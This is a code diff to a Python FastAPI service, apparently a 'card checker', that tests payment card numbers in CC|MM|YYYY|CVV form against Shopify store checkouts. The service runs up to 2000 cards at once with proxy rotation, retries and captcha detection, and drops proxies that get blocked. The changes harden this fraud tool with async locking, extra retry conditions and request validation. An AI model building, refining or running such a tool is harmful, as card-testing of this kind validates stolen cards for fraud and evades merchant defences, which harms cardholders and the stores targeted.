@@ -5,10 +5,12 @@ from curl_cffi.requests import AsyncSession
 import json
 import re
 import random
+import argparse
 from urllib.parse import urlparse
-from fastapi import FastAPI, Query
+from fastapi import FastAPI, Query, HTTPException
 from fastapi.responses import JSONResponse
-from pydantic import BaseModel
+from pydantic import BaseModel, Field
+from typing import List, Optional
 import os
 import time
 import threading
@@ -252,6 +254,14 @@ def is_captcha_required(response_text):
         if indicator.upper() in text_upper:
             return True
     return False
+
+# ── Pydantic Request Models ──────────────────────────────────────────
+class BatchRequest(BaseModel):
+    site: str
+    cards: List[str]
+    variant: Optional[str] = None
+    proxy: Optional[str] = None
+    proxies: Optional[List[str]] = Field(default_factory=list)
 
 async def make_graphql_request_with_captcha_handling(
     session, graphql_url, params, headers, json_data, 
@@ -1162,23 +1172,33 @@ def parse_cc_string(cc_string):
 
 
 # ──────────────────────── Concurrency Engine ────────────────────────
-
-MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT", 2000))  # max cards in flight at once
-_semaphore = None            # asyncio.Semaphore – initialized on startup
+MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT", 2000))
+_semaphore = None
 
 # ── Live stats ──────────────────────────────────────────────────────
 _active_cards = 0
 _total_processed = 0
-_stats_lock = threading.Lock()
+_stats_lock = None
 
+def get_stats_lock():
+    global _stats_lock
+    if _stats_lock is None:
+        _stats_lock = asyncio.Lock()
+    return _stats_lock
 
+def get_concurrency_semaphore():
+    global _semaphore
+    if _semaphore is None:
+        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
+    return _semaphore
 
 async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list, start_proxy_idx=0):
     """Process a single card, guarded by the concurrency semaphore, with smart retry & proxy rotation."""
     global _active_cards, _total_processed
     max_retries = 3
-    async with _semaphore:
-        with _stats_lock:
+    sem = get_concurrency_semaphore()
+    async with sem:
+        async with get_stats_lock():
             _active_cards += 1
         try:
             for attempt in range(max_retries):
@@ -1200,13 +1220,16 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                     # 403 Forbidden — proxy is burned, skip immediately (no backoff)
                     if not success and ('403' in str(msg) or 'forbidden' in error_msg_lower):
                         logger.warning(f"[403] Proxy blocked for {cc[:6]}... — switching")
-                        continue
+                        if attempt < max_retries - 1:
+                            continue
+                        return success, msg, gw, price, cur
 
                     # Check for transient errors that should be retried
                     transient_errors = ['proxy error', 'timeout', 'clientoserror', 'clientconnectorerror', 
                                        'serverdisconnectederror', 'error processing card', 
                                        'failed to get session token', 'request failed', 'throttled',
-                                       'captcha_required', 'invalid json response']
+                                       'captcha_required', 'invalid json response',
+                                       'site error', '503', '502']
                     is_transient = any(t in error_msg_lower for t in transient_errors)
                     
                     if not success and is_transient and attempt < max_retries - 1:
@@ -1222,8 +1245,10 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list
                         await asyncio.sleep(delay)
                         continue
                     return False, f"Error after {max_retries} retries: {str(e)}", "UNKNOWN", "0.00", "USD"
+            # Safety fallback — should never reach here, but prevents NoneType crash
+            return False, "All retries exhausted", "UNKNOWN", "0.00", "USD"
         finally:
-            with _stats_lock:
+            async with get_stats_lock():
                 _active_cards -= 1
                 _total_processed += 1
 
@@ -1244,91 +1269,67 @@ def _build_result(cc_string, success, message, gateway, price, currency, elapsed
         result["Time"] = f"{elapsed:.2f}s"
     return result
 
-# ──────────────────────── FastAPI App ───────────────────────────────
+# ──────────────────────── FastAPI App ────────────────────────────────
 
-app = FastAPI(title="Evelyn Checker API")
-
-# ── Pydantic model for batch requests ───────────────────────────────
-class BatchRequest(BaseModel):
-    site: str = ""
-    cards: list = []
-    proxy: str | None = None
-    proxies: list | None = None
-    variant: str | None = None
-
-# ── Startup: initialize the asyncio semaphore ───────────────────────
-@app.on_event("startup")
-async def startup():
-    global _semaphore
-    _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-    logger.info(f"[ENGINE] FastAPI started | Max concurrency: {MAX_CONCURRENT} | PID {os.getpid()}")
+app = FastAPI()
 
 # ── Single-card endpoint (backward compatible) ──────────────────────
 @app.get('/shopify')
 async def shopify_checker(
-    site: str = Query(None),
-    cc: str = Query(None),
-    proxy: str = Query(None),
-    variant: str = Query(None)
+    site: str = Query(..., description="Target site domain/URL"),
+    cc: str = Query(..., description="Card string in CC|MM|YYYY|CVV format"),
+    proxy: Optional[str] = Query(None, description="Optional proxy connection string")
 ):
-    if not site:
-        return JSONResponse({"error": "Missing 'site' parameter", "status": False}, status_code=400)
-    if not cc:
-        return JSONResponse({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": False}, status_code=400)
-
     try:
-        cc_parts = parse_cc_string(cc)
-    except ValueError as e:
-        return JSONResponse({"error": str(e), "status": False}, status_code=400)
+        try:
+            cc_parts = parse_cc_string(cc)
+        except ValueError as e:
+            raise HTTPException(status_code=400, detail={"error": str(e), "status": False})
 
-    try:
         proxy_list = [proxy] if proxy else []
         _t_start = time.time()
+        
         success, message, gateway, price, currency = await _throttled_process(
             cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
-            site, variant, proxy_list, 0
+            site, None, proxy_list, 0
         )
         _elapsed = time.time() - _t_start
 
         return _build_result(cc, success, message, gateway, price, currency, _elapsed)
 
+    except HTTPException:
+        raise
     except Exception as e:
-        return JSONResponse({
+        raise HTTPException(status_code=500, detail={
             "error": str(e), "status": False,
             "Gateway": "UNKNOWN", "Price": 0.0,
             "Response": f"ERROR: {str(e)}",
-            "cc": cc or ""
-        }, status_code=500)
+            "cc": cc
+        })
 
 # ── Batch endpoint — up to MAX_CONCURRENT cards concurrently ────────
 @app.post('/batch')
-async def batch_checker(req: BatchRequest):
+async def batch_checker(data: BatchRequest):
     """
-    POST JSON body:
-    {
-      "site": "https://example.myshopify.com",
-      "cards": ["4111...|12|2030|123", "5200...|06|27|456", ...],
-      "proxy": "host:port:user:pass",
-      "proxies": ["proxy1", "proxy2", ...]
-    }
+    POST JSON body validation via BatchRequest.
     Max MAX_CONCURRENT cards. If 'proxies' list given, cards rotate across them round-robin.
     """
     try:
-        site = req.site
-        cards = req.cards
-        variant_id = req.variant
+        site = data.site
+        cards = data.cards
+        variant_id = data.variant
 
         # Proxy list support: round-robin across proxies
-        proxy_list = req.proxies or []
-        if not proxy_list and req.proxy:
-            proxy_list = [req.proxy]
+        proxy_list = data.proxies or []
+        if not proxy_list and data.proxy:
+            proxy_list = [data.proxy]
 
         if not site:
-            return JSONResponse({"error": "Missing 'site' field", "status": False}, status_code=400)
-        if not cards or not isinstance(cards, list):
-            return JSONResponse({"error": "Missing or invalid 'cards' array", "status": False}, status_code=400)
+            raise HTTPException(status_code=400, detail={"error": "Missing 'site' field", "status": False})
+        if not cards:
+            raise HTTPException(status_code=400, detail={"error": "Missing or invalid 'cards' array", "status": False})
         if len(cards) > MAX_CONCURRENT:
-            return JSONResponse({"error": f"Max {MAX_CONCURRENT} cards per batch", "status": False}, status_code=400)
+            raise HTTPException(status_code=400, detail={"error": f"Max {MAX_CONCURRENT} cards per batch", "status": False})
 
         # Parse all cards upfront
         parsed = []
@@ -1346,9 +1347,14 @@ async def batch_checker(req: BatchRequest):
                 variant_id = info['variant_id']
             else:
                 err_msg = info[1] if isinstance(info, tuple) else "Failed to fetch product / variant_id"
+                tasks = []
+                for cs, parts, idx in parsed:
+                    async def _fail(cs_val=cs): return cs_val, False, err_msg, "UNKNOWN", "0.00", "USD", 0.0
+                    tasks.append(_fail())
+                results = await asyncio.gather(*tasks)
                 output = []
-                for cs, parts_item, idx in parsed:
-                    output.append(_build_result(cs, False, err_msg, "UNKNOWN", "0.00", "USD", 0.0))
+                for cs, success, msg, gw, price, cur, elapsed in results:
+                    output.append(_build_result(cs, success, msg, gw, price, cur))
                 return output
 
         tasks = []
@@ -1383,8 +1389,10 @@ async def batch_checker(req: BatchRequest):
 
         return output
 
+    except HTTPException:
+        raise
     except Exception as e:
-        return JSONResponse({"error": str(e), "status": False}, status_code=500)
+        raise HTTPException(status_code=500, detail={"error": str(e), "status": False})
 
 # ── Status endpoint ─────────────────────────────────────────────────
 @app.get('/status')
@@ -1415,4 +1423,4 @@ if __name__ == "__main__":
     print(f"[ENGINE] Single: GET /shopify?site=...&cc=...&proxy=...")
     print(f"[ENGINE] Batch:  POST /batch  {{site, cards[], proxy}}")
     port = int(os.environ.get("PORT", 5000))
-    uvicorn.run("app:app", host="0.0.0.0", port=port, workers=4, loop="uvloop")
+    uvicorn.run(app, host='0.0.0.0', port=port)
